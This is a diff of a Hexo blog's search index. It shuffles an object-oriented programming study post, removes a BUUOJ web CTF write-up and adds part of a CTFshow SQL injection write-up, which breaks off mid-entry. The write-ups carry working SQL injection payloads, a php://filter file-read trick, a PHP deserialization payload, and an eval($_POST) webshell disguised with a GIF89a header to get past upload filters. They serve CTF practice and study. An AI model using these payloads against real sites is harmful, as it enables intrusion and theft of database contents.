@@ -105,168 +105,6 @@
       </tags>
   </entry>
   <entry>
-    <title>面向对象思想学习</title>
-    <url>/2021/01/26/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h1 id="面向对象思想学习"><a href="#面向对象思想学习" class="headerlink" title="面向对象思想学习"></a>面向对象思想学习</h1><h2 id="面向对象主要包括七个关键词"><a href="#面向对象主要包括七个关键词" class="headerlink" title="面向对象主要包括七个关键词"></a>面向对象主要包括七个关键词</h2><p>这七个关键词为：数据、方法、对象、类、封装、继承、多态。</p>
-<a id="more"></a>
-<h3 id="1、数据"><a href="#1、数据" class="headerlink" title="1、数据"></a>1、数据</h3><p>根据百度百科得知，数据(data)是信息的<strong>表现形式</strong>和<strong>载体</strong>，是事实或观察的结果，是对客观事物的逻辑归纳，是用于表示客观事物的未经加工的原始素材。<br>例如：学生的档案信息，数字：0，1，2，3等，天气预报上的气温温度，诸如此类都可称为数据。<br>而数据进行加工后，就形成了信息。在计算机中，数据是以二进制信息单元0，1进行表示。</p>
-<h3 id="2、方法"><a href="#2、方法" class="headerlink" title="2、方法"></a>2、方法</h3><p>方法的基本解析是指为获得某种东西或达到某种目的而采取的<strong>途径</strong>，<strong>步骤</strong>和<strong>手段</strong>，而在软件编程语言中，如果将函数定义为类的一部分或者将函数与某个对象绑定，那么该函数就称之为<strong>方法</strong>。<br>方法简单来说，就是你写ACM题的时候自己写的算法，就像为了减少程序运行时间，为了防止TLE，有时候需要自己写一个快速幂函数，这就可以称作方法，为了达成某种目的而去制作能达成这个目的的方式。d=====(￣▽￣*)b</p>
-<h3 id="3、对象"><a href="#3、对象" class="headerlink" title="3、对象"></a>3、对象</h3><p>对象的基本解析是特定人或物，在计算机语言中表现为客观世界中真实存在的人或者物体，在计算机中的逻辑映射。<br>对象可以理解为，在生活中，每个人都是一个对象，每件东西也都是一个对象，可以说<strong>万物皆对象</strong>。在面向对象编程语言中，对象是系统中的基本运行实体，是代码和数据的集合。</p>
-<h3 id="4、类"><a href="#4、类" class="headerlink" title="4、类"></a>4、类</h3><p>类简单来说就是分类。在面向对象中，类是实现信息封装的基础，类是一种引用数据类型，也称类类型。每个类包含数据说明和一组操作数据的方法，而上面说的对象则是类的一种实例。<br>举个例子，人类就是一个基本的类类型，而每个人则是这个类类型的实例，也就是对象，人类这个类包含有姓名、性别、年龄等等这些<strong>数据</strong>说明，同时也有走路、吃饭、工作这些传递能量信息的<strong>方法</strong>。</p>
-<h3 id="5、封装"><a href="#5、封装" class="headerlink" title="5、封装"></a>5、封装</h3><p>封装是对某一类事物进行抽象描述。封装是个动词，通过将姓名、性别、年龄等这些属性抽象到人类这个类类型的过程就叫封装。当我们一说到人类，就能联想到这个人叫什么名字、是男是女、多大年纪等等。同时封装也能隐藏人身上的一些特殊属性，比如：这个人身上有多少钱，这是我们不可得知的。</p>
-<h3 id="6、继承"><a href="#6、继承" class="headerlink" title="6、继承"></a>6、继承</h3><p>继承就是子类继承父类的特征行为，使得子类对象（实例）具有父类的属性和方法，或子类从父类继承方法，使得子类具有父类相同的行为。同时，子类不仅可以继承父类全部的功能，还可以创建增加新数据、新功能。</p>
-<blockquote>
-<p>注意：子类继承父类的功能时，不能选择性的继承父类的部分功能，继承是类与类之间的关系，不是对象与对象之间的关系。</p>
-</blockquote>
-<p>例如：你自己，继承了你父亲的姓名，性别，年龄等这些<strong>属性</strong>，但是你在继承这些属性的同时增加了你会写代码的这么一个方法，而这个写代码的方法是你自己独有的，你的父亲并不具备这个写代码的这个功能。这就是继承。</p>
-<h3 id="7、多态"><a href="#7、多态" class="headerlink" title="7、多态"></a>7、多态</h3><p>讲多态前，需要知道接口这一知识点。<br>接口，是一种特殊的类，在这个类中指定必须做什么，但不用规定它如何去做，而多态就是以多种方式告诉这个接口类该如何去做。</p>
-<blockquote>
-<p>例如：定义一个接口类，这个类中只有一个吃饭的方法，所以我们可以知道这个类中必须要做吃饭这件事，但是吃什么，怎么吃，在哪里吃？这里就可以通过多态来实现了，我们可以再定义两个类去实现这个接口，一个类告诉它我要去中餐厅用筷子吃鱼，另一个类告诉它我要去西餐厅用刀叉吃牛排</p>
-</blockquote>
-<p>简而言之，多态就是自定义多个方法使接口类实现一件事情的达成。φ(*￣0￣)</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>面向对象其实就是环绕类进行拓展，将数据、方法封装进类中，而类又可以创建对象。多态则可以使类增加多种不同的方法，而继承可以使类在原有基础上进行扩展，使类拥有更多的属性、方法。</p>
-]]></content>
-      <categories>
-        <category>编程学习</category>
-      </categories>
-      <tags>
-        <tag>other</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BUUOJ-Web</title>
-    <url>/2021/03/11/web/web/</url>
-    <content><![CDATA[<p>BUUOJ-Web WriteUp</p>
-<a id="more"></a>
-<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>简单的sql注入</p>
-<p>这里是payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; or 1&#x3D;1 #</span><br></pre></td></tr></table></figure>
-<p>可以登陆进去之后直接看到flag</p>
-<p><img src="https://i.loli.net/2021/03/11/4BYLC9cDZv7ztT2.png"></p>
-<blockquote>
-<p>flag{2c793226-369d-4941-af62-10463af21b6c}</p>
-</blockquote>
-<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>尝试了各种姿势后发现可以用堆叠注入</p>
-<p>爆库名</p>
-<blockquote>
-<p>1’;show databases;#</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/03/11/oBOT9y7iNzrgacA.png"></p>
-<p>爆表名</p>
-<blockquote>
-<p>1’;show tables;#</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/03/11/A7j2dthgLny8iQC.png"></p>
-<p>爆列名</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;show columns from &#96;1919810931114514&#96;;# #爆1919810931114514表</span><br><span class="line">1&#39;;show columns from &#96;words&#96;;# #爆words表</span><br></pre></td></tr></table></figure>
-<p>发现id在words表中，那么咱只需要改个表名就行了</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;rename table &#96;words&#96; to &#96;words1&#96;; # 把表words更名为words1</span><br><span class="line">rename tables &#96;1919810931114514&#96; to &#96;words&#96;; # 把表1919810931114514更名为words</span><br><span class="line">alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100); # 把words中的列名flag更名为id</span><br></pre></td></tr></table></figure>
-<p>然后只要登入就可以看到flag了</p>
-<blockquote>
-<p>1’ or 1=1 #</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/03/11/S1cdzKsJLBnDA5P.png"></p>
-<h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>打开看见一只可爱的小猫</p>
-<p>直接进入ctrl + U看源代码，在下面发现藏东西了</p>
-<p><img src="https://i.loli.net/2021/03/11/pYXv52zRePSgiOu.png"></p>
-<p>按着GET一个cat变量，出现flag</p>
-<p><img src="https://i.loli.net/2021/03/11/4sCJkcIQWBzdv9p.png"></p>
-<blockquote>
-<p>flag{04dfe2f2-bbf0-43f3-9bf1-faab0790de78}</p>
-</blockquote>
-<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>ctrl+U发现一个Archive_room.php</p>
-<p>用burpsuite抓一下包，发现一个secr3t.php</p>
-<p><img src="https://i.loli.net/2021/03/13/2pXDMTH8ZsvziE4.png"></p>
-<p>发现是一段简单的代码审计和文件包含</p>
-<p>咱可以用伪协议</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/03/13/gCqDYKie7H3RVP2.png"></p>
-<p>得到一串base64编码，解码即可得到flag</p>
-<blockquote>
-<p>flag{d67ab513-7a2d-4e45-a27a-99486f6f99ee}</p>
-</blockquote>
-<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>进去后发现是简单的sql注入</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; union select 1,2,3 # # 查看回显</span><br><span class="line">-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),3 # #爆表名</span><br><span class="line">-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;l0ve1ysq1&#39;),3 # # 爆列名</span><br><span class="line">-1&#39; union select 1,(select group_concat(concat_ws(0x7e, username, password)) from l0ve1ysq1),3 # #爆数据</span><br></pre></td></tr></table></figure>
-<p>最后得到flag</p>
-<blockquote>
-<p>flag{94e175f4-807f-404e-a433-65501ae8595b}</p>
-</blockquote>
-<h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>这题提示已经POST了一个一句话木马</p>
-<p>直接用蚁剑连接</p>
-<p><img src="https://i.loli.net/2021/03/13/KYiDsjup9zoFG7b.png"></p>
-<p>  得到flag</p>
-<blockquote>
-<p>flag{46dce079-289a-4494-98da-139ce0e08a9a}</p>
-</blockquote>
-<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p> ctrl+U发现一个secret.php</p>
-<p>进入后依照提示逐一添加header</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Referer: https://www.Sycsecret.com</span><br><span class="line">User-Agent: Syclover</span><br><span class="line">X-Forwarded-For: localhost</span><br></pre></td></tr></table></figure>
-<p>即可得到flag</p>
-<blockquote>
-<p>flag{da768d87-8706-4596-bf42-71c1b8fa6453}</p>
-</blockquote>
-<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>有提示可以知道有网站备份文件</p>
-<p>运用脚本进行扫描</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&#x27;http://bb232cbc-9635-4f1f-bbdb-d01f82b431ee.node3.buuoj.cn/&#x27;</span>		<span class="comment"># url为被扫描地址，后不加‘/’</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 常见的网站源码备份文件名</span></span><br><span class="line">list1 = [<span class="string">&#x27;web&#x27;</span>, <span class="string">&#x27;website&#x27;</span>, <span class="string">&#x27;backup&#x27;</span>, <span class="string">&#x27;back&#x27;</span>, <span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;wwwroot&#x27;</span>, <span class="string">&#x27;temp&#x27;</span>]</span><br><span class="line"><span class="comment"># 常见的网站源码备份文件后缀</span></span><br><span class="line">list2 = [<span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;tar.gz&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;rar&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> list2:</span><br><span class="line">        back = <span class="built_in">str</span>(i) + <span class="string">&#x27;.&#x27;</span> + <span class="built_in">str</span>(j)</span><br><span class="line">        url = <span class="built_in">str</span>(url1) + <span class="string">&#x27;/&#x27;</span> + back</span><br><span class="line">        print(back + <span class="string">&#x27;    &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        print(requests.get(url).status_code)</span><br></pre></td></tr></table></figure>
-<p>得到一个<a href="http://www.zip/">www.zip</a></p>
-<p>发现是一道php反序列化绕过，这里简化了一下代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>根据代码构造payload</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">select=O:<span class="number">4</span>:<span class="string">&quot;Name&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">14</span>:<span class="string">&quot;\0Name\0username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;\0Name\0password&quot;</span>;i:<span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure>
-<p>然后用python提交get，成功得到flag（虽然不知道为啥Hackbar提交没反应</p>
-<blockquote>
-<p>flag{361e4af6-f242-4f37-888e-17491b76ecd2}</p>
-</blockquote>
-<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>进入发现需要上传文件，构造一个一句话木马扔上去</p>
-<p>用burpsuites抓包改一下文件类型</p>
-<p>然后提示不能包含&lt;?字符，去度娘搜了一下之后发现可以在文件头部加上**GIF89a?**绕过这个点</p>
-<p>然后又提示不能用php类型文件</p>
-<p>一番查找了之后发现了一个.phtml类型</p>
-<p>重新构造了一下木马</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;rossweisse&#39;])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-<p>用菜刀链接即可得到flag</p>
-<blockquote>
-<p>flag{43921141-5d8f-4c88-b07c-55b0801220ca}</p>
-</blockquote>
-<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>这题也是一道sql注入题</p>
-<p>按照原来的套路试了几次之后发现把关键字都ban了</p>
-<p>那么我们可双写关键字来进行绕过</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; ununionion seselectlect 1,group_concat(table_name),3  frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;database() %23 #爆表名</span><br><span class="line">-1&#39; ununionion seselectlect 1,group_concat(column_name),3  frfromom infoorrmation_schema.columns whwhereere table_schema&#x3D;database() aandnd table_name&#x3D;&#39;b4bsql&#39; %23 #爆列名</span><br><span class="line">-1&#39; ununionion seselectlect 1,group_concat(concat_ws(0x7e,username,passwoorrd)),3  frfromom b4bsql %23 #爆数据</span><br></pre></td></tr></table></figure>
-<p>拿到flag</p>
-<blockquote>
-<p>flag{cbf6aeea-a401-4c47-b000-c373eaef6289}</p>
-</blockquote>
-<h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>这题进来之后发现只有一个payflag页面可以进</p>
-<p>进入之后ctrl+U在下面发现了一串代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">	~~~post money <span class="keyword">and</span> password~~~</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (is_numeric(<span class="variable">$password</span>)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;<span class="keyword">elseif</span> (<span class="variable">$password</span> == <span class="number">404</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Password Right!&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
-<p>可以得知咱要以POST方式发送一个不是数字并且要等于404的password变量和money变量</p>
-<p>发现burpsuite重发之后会出现一句<strong>Only Cuit’s students can buy the FLAG</strong></p>
-<p>这里咱重新查看下抓的包，发现了一个user参数，令user=1</p>
-<p>发送出去之后前两个都正确了，但是还是出现了一句<strong>Nember lenth is too long</strong></p>
-<p>那只能是money参数出现了问题，将money=100000000改为money=1e9即可得到flag</p>
-<p><img src="https://i.loli.net/2021/03/14/LSq3PIr8Q2TlzcO.png"></p>
-<blockquote>
-<p>flag{68ff87f9-0c7f-4c49-b057-2af8e9ea3ed3}</p>
-</blockquote>
-<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>这题sql注入惯例试了下<strong>1’ or 1=1 %23</strong></p>
-<p>结果很友善的回了一句臭弟弟</p>
-<p>之后试了一下其他的发现把空格等一些字符还有union给ban了，于是就想到了报错注入</p>
-<p><strong>1’or(updatexml(1,concat_ws((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e,0x7e),1))%23 #爆表名</strong><br><strong>1’or(updatexml(1,concat_ws((select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())),0x7e,0x7e),1))%23 #爆列名</strong><br><strong>1’or(updatexml(1,concat_ws((select(concat_ws(0x7e,username,password))from(H4rDsq1)),0x7e,0x7e),1))%23 #爆数据</strong>（结果发现只有一半，后面查到了一个right()</p>
-<p><strong>1’or(updatexml(1,concat_ws((select(right(group_concat(password),20))from(H4rDsq1)),0x7e,0x7e),1))%23 #爆后边的flag</strong>（这里要注意flag的连接，不是对半开的</p>
-<p>这里是flag</p>
-<blockquote>
-<p>flag{16f2507c-b985-4744-9b3b-8f02007f0c29}</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>WriteUp</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>BUUOJ</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>github+hexo搭建个人博客教程</title>
     <url>/2021/01/12/github+hexo%E7%9A%84%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/</url>
     <content><![CDATA[<h1 id="搭建步骤"><a href="#搭建步骤" class="headerlink" title="搭建步骤"></a>搭建步骤</h1><ul>
@@ -305,7 +143,7 @@
 <h1 id="githubSSH配置"><a href="#githubSSH配置" class="headerlink" title="githubSSH配置"></a>githubSSH配置</h1><p>搭建完仓库后就开始配置githubSSH。</p>
 <p>进入git bash中，按顺序输入如下代码：</p>
 <blockquote>
-<p>git config –global user.email “<a href="mailto:&#x78;&#120;&#120;&#x40;&#113;&#113;&#46;&#99;&#x6f;&#x6d;">&#x78;&#120;&#120;&#x40;&#113;&#113;&#46;&#99;&#x6f;&#x6d;</a>“    //填写注册github的邮箱</p>
+<p>git config –global user.email “<a href="mailto:&#x78;&#120;&#120;&#x40;&#113;&#113;&#46;&#x63;&#111;&#x6d;">&#x78;&#120;&#120;&#x40;&#113;&#113;&#46;&#x63;&#111;&#x6d;</a>“    //填写注册github的邮箱</p>
 </blockquote>
 <blockquote>
 <p>git config –global user.name “xxxx”    //github 用户名</p>
@@ -344,6 +182,120 @@
       <tags>
         <tag>hexo</tag>
         <tag>next</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>面向对象思想学习</title>
+    <url>/2021/01/26/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="面向对象思想学习"><a href="#面向对象思想学习" class="headerlink" title="面向对象思想学习"></a>面向对象思想学习</h1><h2 id="面向对象主要包括七个关键词"><a href="#面向对象主要包括七个关键词" class="headerlink" title="面向对象主要包括七个关键词"></a>面向对象主要包括七个关键词</h2><p>这七个关键词为：数据、方法、对象、类、封装、继承、多态。</p>
+<a id="more"></a>
+<h3 id="1、数据"><a href="#1、数据" class="headerlink" title="1、数据"></a>1、数据</h3><p>根据百度百科得知，数据(data)是信息的<strong>表现形式</strong>和<strong>载体</strong>，是事实或观察的结果，是对客观事物的逻辑归纳，是用于表示客观事物的未经加工的原始素材。<br>例如：学生的档案信息，数字：0，1，2，3等，天气预报上的气温温度，诸如此类都可称为数据。<br>而数据进行加工后，就形成了信息。在计算机中，数据是以二进制信息单元0，1进行表示。</p>
+<h3 id="2、方法"><a href="#2、方法" class="headerlink" title="2、方法"></a>2、方法</h3><p>方法的基本解析是指为获得某种东西或达到某种目的而采取的<strong>途径</strong>，<strong>步骤</strong>和<strong>手段</strong>，而在软件编程语言中，如果将函数定义为类的一部分或者将函数与某个对象绑定，那么该函数就称之为<strong>方法</strong>。<br>方法简单来说，就是你写ACM题的时候自己写的算法，就像为了减少程序运行时间，为了防止TLE，有时候需要自己写一个快速幂函数，这就可以称作方法，为了达成某种目的而去制作能达成这个目的的方式。d=====(￣▽￣*)b</p>
+<h3 id="3、对象"><a href="#3、对象" class="headerlink" title="3、对象"></a>3、对象</h3><p>对象的基本解析是特定人或物，在计算机语言中表现为客观世界中真实存在的人或者物体，在计算机中的逻辑映射。<br>对象可以理解为，在生活中，每个人都是一个对象，每件东西也都是一个对象，可以说<strong>万物皆对象</strong>。在面向对象编程语言中，对象是系统中的基本运行实体，是代码和数据的集合。</p>
+<h3 id="4、类"><a href="#4、类" class="headerlink" title="4、类"></a>4、类</h3><p>类简单来说就是分类。在面向对象中，类是实现信息封装的基础，类是一种引用数据类型，也称类类型。每个类包含数据说明和一组操作数据的方法，而上面说的对象则是类的一种实例。<br>举个例子，人类就是一个基本的类类型，而每个人则是这个类类型的实例，也就是对象，人类这个类包含有姓名、性别、年龄等等这些<strong>数据</strong>说明，同时也有走路、吃饭、工作这些传递能量信息的<strong>方法</strong>。</p>
+<h3 id="5、封装"><a href="#5、封装" class="headerlink" title="5、封装"></a>5、封装</h3><p>封装是对某一类事物进行抽象描述。封装是个动词，通过将姓名、性别、年龄等这些属性抽象到人类这个类类型的过程就叫封装。当我们一说到人类，就能联想到这个人叫什么名字、是男是女、多大年纪等等。同时封装也能隐藏人身上的一些特殊属性，比如：这个人身上有多少钱，这是我们不可得知的。</p>
+<h3 id="6、继承"><a href="#6、继承" class="headerlink" title="6、继承"></a>6、继承</h3><p>继承就是子类继承父类的特征行为，使得子类对象（实例）具有父类的属性和方法，或子类从父类继承方法，使得子类具有父类相同的行为。同时，子类不仅可以继承父类全部的功能，还可以创建增加新数据、新功能。</p>
+<blockquote>
+<p>注意：子类继承父类的功能时，不能选择性的继承父类的部分功能，继承是类与类之间的关系，不是对象与对象之间的关系。</p>
+</blockquote>
+<p>例如：你自己，继承了你父亲的姓名，性别，年龄等这些<strong>属性</strong>，但是你在继承这些属性的同时增加了你会写代码的这么一个方法，而这个写代码的方法是你自己独有的，你的父亲并不具备这个写代码的这个功能。这就是继承。</p>
+<h3 id="7、多态"><a href="#7、多态" class="headerlink" title="7、多态"></a>7、多态</h3><p>讲多态前，需要知道接口这一知识点。<br>接口，是一种特殊的类，在这个类中指定必须做什么，但不用规定它如何去做，而多态就是以多种方式告诉这个接口类该如何去做。</p>
+<blockquote>
+<p>例如：定义一个接口类，这个类中只有一个吃饭的方法，所以我们可以知道这个类中必须要做吃饭这件事，但是吃什么，怎么吃，在哪里吃？这里就可以通过多态来实现了，我们可以再定义两个类去实现这个接口，一个类告诉它我要去中餐厅用筷子吃鱼，另一个类告诉它我要去西餐厅用刀叉吃牛排</p>
+</blockquote>
+<p>简而言之，多态就是自定义多个方法使接口类实现一件事情的达成。φ(*￣0￣)</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>面向对象其实就是环绕类进行拓展，将数据、方法封装进类中，而类又可以创建对象。多态则可以使类增加多种不同的方法，而继承可以使类在原有基础上进行扩展，使类拥有更多的属性、方法。</p>
+]]></content>
+      <categories>
+        <category>编程学习</category>
+      </categories>
+      <tags>
+        <tag>other</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CTFshow web入门 sql</title>
+    <url>/2021/02/09/web/sql/CTF%20show%20web%E5%85%A5%E9%97%A8%20sql/</url>
+    <content><![CDATA[<p>CTFshow web入门 sql注入</p>
+<a id="more"></a>
+<h1 id="sql171"><a href="#sql171" class="headerlink" title="sql171"></a>sql171</h1><p>已给出提示：</p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;拼接sql语句查找指定ID用户</span><br><span class="line">$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</span><br></pre></td></tr></table></figure>
+<p>首先判断注入点</p>
+</blockquote>
+<blockquote>
+<p>id=1’ and 1=1</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/14a98fd34b12ede5b79837c8cb71cee6.png" alt="1"></p>
+<p>没报错也没有显示任何信息，将1=1改为1=2</p>
+<blockquote>
+<p>id=1’ and 1=2</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6618d1687fc6391b7fab913fa7304d6f.png" alt="2"></p>
+<p>还是没有显示任何信息，说明可以使用 ‘ 字符注入</p>
+<p>然后开始判断表有多少列</p>
+<blockquote>
+<p>id=1’ order by 1,2,3 –+</p>
+</blockquote>
+<p>没反应</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/baa7fb6b509789bd13a55341b5ed2ead.png" alt="3"></p>
+<blockquote>
+<p>id=1’ order by 1,2,3,4 –+</p>
+</blockquote>
+<p>出现异常，说明只有三列</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/395e1e2c8fdbcc279cb5cdd97dc5fff3.png" alt="4"></p>
+<p>查询用户，数据库</p>
+<blockquote>
+<p>id=1’ union select 1,user(),database() –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c082ec58008ebb62f2ad28c500341d79.png" alt="5"></p>
+<p>查询该数据库下有哪些表</p>
+<blockquote>
+<p>id=1’ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’ctfshow_web’),3 –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/44d780e1a497be20a272bf6ad71e0a67.png" alt="6"></p>
+<p>知道表名就可以查询表里的内容了</p>
+<blockquote>
+<p>id=1’ union select id,username,password from ctfshow_user –+</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c4aac8c93bb0e44d7dcd3cc474e7da1a.png" alt="7"></p>
+<p>w_user –+</p>
+<p>[外链图片转存中…(img-4ECGGwnL-1612801653075)]</p>
+<p>拿到flag</p>
+<h1 id="sql172"><a href="#sql172" class="headerlink" title="sql172"></a>sql172</h1><p>进入题目后已给出查询语句</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>于是根据查询语句构造payload</p>
+<blockquote>
+<p>-1” ‘ union select 1,2,3 –+</p>
+</blockquote>
